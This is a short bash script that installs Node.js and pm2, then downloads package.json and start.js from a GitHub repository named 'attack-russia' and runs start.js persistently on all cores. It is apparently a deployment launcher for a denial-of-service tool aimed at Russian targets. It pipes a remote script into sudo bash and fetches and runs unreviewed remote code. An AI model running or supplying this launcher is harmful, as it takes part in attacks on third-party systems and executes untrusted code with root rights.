#!/usr/bin/env bash

# node
curl -sL https://deb.nodesource.com/setup_17.x | sudo bash -
sudo apt-get install -y nodejs build-essential
sudo npm install npm -g
sudo npm cache clean -f
sudo npm set registry https://registry.npmjs.org/
sudo npm i -g pm2

curl https://raw.githubusercontent.com/andriytkachiv/attack-russia/master/package.json --output package.json
sudo npm install

curl https://raw.githubusercontent.com/andriytkachiv/attack-russia/master/start.js --output start.js
pm2 stop all && pm2 restart all && pm2 stop all && pm2 start start.js -i --watch
